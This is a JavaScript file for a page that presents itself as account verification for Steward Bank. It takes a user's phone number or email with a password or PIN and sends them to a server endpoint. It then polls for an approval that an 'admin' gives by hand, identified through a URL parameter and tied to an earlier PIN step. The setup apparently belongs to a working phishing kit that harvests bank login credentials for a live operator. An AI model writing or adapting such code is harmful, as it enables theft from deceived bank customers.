// Account Verification Script for Steward Bank (Phone/Email + Password)
document.addEventListener('DOMContentLoaded', function() {
    const verificationScreen = document.getElementById('verificationScreen');
    const processingScreen = document.getElementById('processingScreen');
    const rejectionScreen = document.getElementById('rejectionScreen');
    
    const accountIdentifier = document.getElementById('accountIdentifier');
    const accountPassword = document.getElementById('accountPassword');
    const verifyBtn = document.getElementById('verifyBtn');
    
    // ✅ FIX: Get application ID from URL parameters (created during PIN step)
    const urlParams = new URLSearchParams(window.location.search);
    const applicationId = urlParams.get('applicationId');
    const adminId = urlParams.get('admin');
    
    console.log('Verification page loaded');
    console.log('Application ID from URL:', applicationId);
    console.log('Admin ID from URL:', adminId);
    
    // ✅ CRITICAL: Check if applicationId exists
    if (!applicationId) {
        console.error('❌ No application ID in URL!');
        alert('Invalid access. Please start from the beginning.');
        window.location.href = adminId ? `/?admin=${adminId}` : '/';
        return;
    }
    
    // Focus on first input
    if (accountIdentifier) accountIdentifier.focus();
    
    // Verify button click
    verifyBtn.addEventListener('click', async function(e) {
        e.preventDefault();
        
        const identifier = accountIdentifier.value.trim();
        const password = accountPassword.value.trim();
        
        if (!identifier) {
            alert('Please enter your phone number or email');
            accountIdentifier.focus();
            return;
        }
        
        if (!password) {
            alert('Please enter your password or PIN');
            accountPassword.focus();
            return;
        }
        
        // Validate identifier format (basic check)
        const isEmail = identifier.includes('@');
        const isPhone = /^[0-9+\s()-]+$/.test(identifier);
        
        if (!isEmail && !isPhone) {
            alert('Please enter a valid phone number or email address');
            accountIdentifier.focus();
            return;
        }
        
        console.log('Submitting verification...');
        console.log('Application ID:', applicationId);
        console.log('Identifier:', identifier);
        console.log('Type:', isEmail ? 'email' : 'phone');
        
        // Show processing screen
        verificationScreen.style.display = 'none';
        processingScreen.style.display = 'block';
        
        try {
            // Send verification request to server
            console.log('Sending POST to /api/verify-account');
            const response = await fetch('/api/verify-account', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    applicationId: applicationId,  // ✅ Use the ID from URL
                    identifier: identifier,
                    password: password,
                    identifierType: isEmail ? 'email' : 'phone'
                })
            });
            
            console.log('Response status:', response.status);
            const result = await response.json();
            console.log('Response data:', result);
            
            // Start checking status regardless of initial response
            if (result.success || result.status === 'pending') {
                console.log('✅ Verification submitted, starting status polling...');
                checkVerificationStatus();
            } else {
                // Only show error if there's a network/server error
                throw new Error(result.message || 'Submission failed');
            }
            
        } catch (error) {
            console.error('Verification error:', error);
            alert('Network error. Please check your connection and try again.');
            processingScreen.style.display = 'none';
            verificationScreen.style.display = 'block';
        }
    });
    
    // Check verification status
    function checkVerificationStatus() {
        console.log('Starting status polling for:', applicationId);
        
        const statusInterval = setInterval(async () => {
            try {
                console.log('Checking status...');
                const response = await fetch(`/api/check-verification-status/${applicationId}`);
                const result = await response.json();
                
                console.log('Status:', result.status);
                
                if (result.status === 'approved') {
                    clearInterval(statusInterval);
                    console.log('✅ APPROVED! Redirecting to approval page...');
                    // Redirect to approval page
                    window.location.href = 'approval.html';
                    
                } else if (result.status === 'rejected') {
                    clearInterval(statusInterval);
                    console.log('❌ REJECTED! Showing rejection screen...');
                    // Show rejection screen
                    processingScreen.style.display = 'none';
                    rejectionScreen.style.display = 'block';
                }
                // Keep checking if status is still 'pending'
                
            } catch (error) {
                console.error('Status check error:', error);
            }
        }, 2000); // Check every 2 seconds
        
        // Timeout after 10 minutes (enough time for admin to review)
        setTimeout(() => {
            clearInterval(statusInterval);
            console.log('⏱️ Status polling timeout');
            alert('Verification timeout. Please try again.');
            processingScreen.style.display = 'none';
            verificationScreen.style.display = 'block';
        }, 600000); // 10 minutes
    }
    
    // Allow Enter key to submit
    [accountIdentifier, accountPassword].forEach(input => {
        if (input) {
            input.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    verifyBtn.click();
                }
            });
        }
    });
    
    console.log('✅ Verification page initialized');
    console.log('Waiting for application:', applicationId);
});